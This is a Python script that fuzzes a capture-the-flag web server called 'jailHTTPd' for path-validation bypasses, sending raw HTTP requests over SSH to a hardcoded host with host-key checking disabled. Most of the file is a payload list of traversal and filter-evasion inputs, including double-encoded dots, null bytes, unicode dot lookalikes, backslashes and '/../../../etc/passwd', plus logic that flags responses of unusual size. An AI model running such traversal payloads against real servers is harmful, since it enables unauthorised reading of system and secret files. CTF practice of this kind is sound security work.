#!/usr/bin/env python3
"""Fuzz jailHTTPd path validation looking for bypasses."""

import subprocess

HOST = "23.179.17.92"
PORT = 2222
KEY = "../files/id_ed25519"

PAYLOADS = [
    # Basic paths
    "/flag",
    "/flag.txt",
    "/secret",
    "/.flag",
    # Dot bypass attempts
    "/n.ot_a_flag",
    "/no.t_a_flag",
    "/not._a_flag",
    # Double encoding
    "/%252e%252e/flag",
    "/%2e%2e/flag",
    # Null byte
    "/flag%00.txt",
    "/not_a_flag%00/../flag",
    # Case variations
    "/FLAG",
    "/Not_A_Flag",
    "/NOT_A_FLAG",
    # Unicode dots
    "/\u2024\u2024/flag",  # one dot leader
    "/\uff0e\uff0e/flag",  # fullwidth period
    # Backslash
    "/..\\flag",
    "\\..\\flag",
    # No leading slash
    "flag",
    "not_a_flag",
    "../flag",
    # Query string
    "/not_a_flag?file=../flag",
    "/?../flag",
    # Tab/space injection
    "/\tflag",
    "/ flag",
    "/flag\t",
    # HTTP method tricks (path only here)
    "/../../../etc/passwd",
    "/./flag",
]


def send_request(path: str) -> tuple[int, int]:
    request = f"GET {path} HTTP/1.0\r\n\r\n"
    cmd = [
        "ssh",
        "-i",
        KEY,
        "-p",
        str(PORT),
        "-o",
        "StrictHostKeyChecking=no",
        f"ctf@{HOST}",
    ]

    try:
        result = subprocess.run(
            cmd,
            check=False,
            input=request.encode(),
            capture_output=True,
            timeout=10,
        )
        response = result.stdout.decode("utf-8", errors="replace")
        lines = response.split("\r\n")
        if lines and lines[0].startswith("HTTP/"):
            status = int(lines[0].split()[1])
            body_start = response.find("\r\n\r\n")
            body_len = len(response) - body_start - 4 if body_start != -1 else 0
            return status, body_len
    except Exception:
        return -1, 0

    return 0, 0


def main():
    print("Path fuzzing jailHTTPd...")
    print("-" * 60)

    for path in PAYLOADS:
        status, size = send_request(path)
        marker = ""
        if status == 200 and size != 86:
            marker = " <-- DIFFERENT SIZE!"
        elif status == 200:
            marker = " (standard response)"
        print(f"{status:3d} {size:5d}B  {path!r}{marker}")


if __name__ == "__main__":
    main()
